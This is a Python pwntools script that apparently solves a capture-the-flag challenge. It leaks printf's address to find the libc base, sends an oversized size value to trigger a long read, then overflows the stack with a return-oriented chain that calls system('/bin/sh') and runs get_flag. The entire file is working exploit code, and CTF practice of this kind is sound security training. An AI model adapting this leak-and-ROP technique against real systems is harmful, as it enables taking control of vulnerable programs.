import re
import struct

from pwnlib.context import context
from pwnlib.elf import ELF
from pwnlib.tubes.remote import remote


def main():
    context(arch="amd64")
    libc = ELF("docker-libc")

    conn = remote("ctf.dscmunich.de", 10003)

    # printf leak -> Find out libc base
    conn.recvuntil(b"mine is ")
    printf = int(conn.recvuntil(b"!")[:-1], 16)
    libc.address = printf - libc.functions.printf.address

    # Send negative size that will then trigger a 0x100 read
    conn.recvuntil(b"(max: 10)?\n")
    conn.send(b"0xffffffff00000100\n")
    conn.recvline()

    # ROP to the flag
    rop = b"A" * 56
    rop += struct.pack("<Q", libc.address + 0x233d1)  # ret; (for stack alignment)
    rop += struct.pack("<Q", libc.address + 0x23b65)  # pop rdi; ret;
    rop += struct.pack("<Q", next(libc.search(b"/bin/sh")))
    rop += struct.pack("<Q", libc.functions.system.address)
    conn.send(rop + b"\n")

    conn.send(b"get_flag && exit\n")

    flag = re.search(r"DSC\{.+}", conn.recvallS()).group(0)
    print(flag)


if __name__ == '__main__':
    main()
